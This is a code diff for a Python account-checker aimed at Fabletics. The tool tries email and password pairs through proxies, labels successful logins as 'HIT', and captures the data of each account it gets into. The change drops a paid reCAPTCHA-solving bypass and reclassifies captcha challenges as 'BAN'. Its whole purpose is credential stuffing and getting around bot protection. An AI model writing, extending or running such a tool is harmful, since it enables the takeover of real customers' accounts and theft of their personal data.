@@ -5,7 +5,6 @@ from typing import Any
 
 import os
 
-from .captcha import captcha_api_key, needs_captcha, solve_recaptcha
 from .client import FableticsAPIError, FableticsClient
 from .config import DEFAULT_PROXY
 from .proxy import parse_proxy
@@ -160,43 +159,32 @@ def _is_auth_failure(message: str) -> bool:
     )
 
 
-def _is_captcha_failure(message: str) -> bool:
+def _is_captcha(message: str, exc: FableticsAPIError) -> bool:
     lower = message.lower()
-    return (
-        "validation failed on recaptcharesponse" in lower
-        or "invalid captcha" in lower
-        or "captcha verification" in lower
+    if exc.captcha_required:
+        return True
+    return "recaptcha" in lower or (
+        "captcha" in lower and "authentication" not in lower
     )
 
 
 def _classify_api_error(exc: FableticsAPIError, email: str, password: str) -> CheckResult:
     message = str(exc)
     lower = message.lower()
+    if _is_captcha(message, exc):
+        return CheckResult(
+            status="BAN",
+            email=email,
+            password=password,
+            message="Captcha required",
+        )
     if exc.retryable:
         return CheckResult(status="RETRY", email=email, password=password, message=message)
     if _is_auth_failure(message):
         return CheckResult(status="FAIL", email=email, password=password, message="Invalid credentials")
-    if exc.captcha_required or needs_captcha(message) or _is_captcha_failure(message):
-        return CheckResult(
-            status="RETRY",
-            email=email,
-            password=password,
-            message=message,
-        )
     if exc.status_code == 401 and "session required" not in lower:
         return CheckResult(status="RETRY", email=email, password=password, message=message)
     return CheckResult(status="ERROR", email=email, password=password, message=message)
-
-
-def _attempt_check(
-    client: FableticsClient,
-    email: str,
-    password: str,
-    recaptcha_response: str | None = None,
-) -> CheckResult:
-    login = client.login(email, password, recaptcha_response=recaptcha_response)
-    data = capture_account_data(client, login.access_token, login.customer)
-    return CheckResult(status="HIT", email=email, password=password, data=data)
 
 
 def check_account(
@@ -212,37 +200,10 @@ def check_account(
     client = FableticsClient(proxy=resolved_proxy, timeout=timeout)
 
     try:
-        return _attempt_check(client, email, password)
+        login = client.login(email, password)
+        data = capture_account_data(client, login.access_token, login.customer)
+        return CheckResult(status="HIT", email=email, password=password, data=data)
     except FableticsAPIError as exc:
-        if exc.captcha_required or needs_captcha(str(exc)):
-            if not captcha_api_key():
-                return CheckResult(
-                    status="RETRY",
-                    email=email,
-                    password=password,
-                    message="Captcha required — set CAPSOLVER_API_KEY",
-                )
-            try:
-                token = solve_recaptcha(timeout=min(timeout * 2, 120))
-            except Exception as solve_exc:
-                return CheckResult(
-                    status="RETRY",
-                    email=email,
-                    password=password,
-                    message=f"Captcha solve failed: {solve_exc}",
-                )
-            if not token:
-                return CheckResult(
-                    status="RETRY",
-                    email=email,
-                    password=password,
-                    message="Captcha required — solver returned empty token",
-                )
-            try:
-                return _attempt_check(client, email, password, recaptcha_response=token)
-            except FableticsAPIError as retry_exc:
-                return _classify_api_error(retry_exc, email, password)
-
         return _classify_api_error(exc, email, password)
     except Exception as exc:
         return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
